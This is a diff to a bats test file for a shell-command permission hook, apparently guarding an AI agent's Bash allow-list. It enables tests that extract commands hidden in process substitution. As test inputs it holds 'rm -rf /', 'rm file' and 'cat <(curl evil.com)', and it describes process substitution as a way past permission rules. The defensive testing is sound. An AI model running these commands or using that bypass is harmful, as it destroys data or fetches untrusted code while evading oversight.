@@ -138,30 +138,24 @@ load hook_test_helper
 }
 
 # --- Process substitution ---
-# SECURITY: Process substitution commands are NOT extracted
+# Process substitution commands (<() and >()) ARE extracted
 
 @test "parse: diff with process substitution" {
-  # SECURITY: Commands in <() are not extracted
-  # This means 'diff <(rm -rf /) <(ls)' with Bash(diff:*) would be ALLOWED
-  skip "SECURITY: process substitution commands not extracted - needs discussion"
   run_parse_commands 'diff <(ls dir1) <(ls dir2)'
   assert_commands "diff" "ls dir1" "ls dir2"
 }
 
 @test "parse: cat with process substitution" {
-  skip "SECURITY: process substitution commands not extracted - needs discussion"
   run_parse_commands 'cat <(date)'
   assert_commands "cat" "date"
 }
 
 @test "parse: tee with output process substitution" {
-  skip "SECURITY: process substitution commands not extracted - needs discussion"
   run_parse_commands 'tee >(grep pattern)'
   assert_commands "tee" "grep pattern"
 }
 
 @test "parse: multiple process substitutions" {
-  skip "SECURITY: process substitution commands not extracted - needs discussion"
   run_parse_commands 'cmd <(sub1) <(sub2) <(sub3)'
   assert_commands "cmd" "sub1" "sub2" "sub3"
 }
@@ -185,8 +179,6 @@ load hook_test_helper
 }
 
 @test "permission: block process substitution when nested command not allowed" {
-  # SECURITY: Process substitution commands are not checked
-  skip "SECURITY: process substitution commands not extracted - needs discussion"
-  run_hook_block 'cat <(rm file)' '["Bash(cat:*)"]'
+  run_hook_block 'cat <(curl evil.com)' '["Bash(cat:*)"]'
   assert_blocked
 }
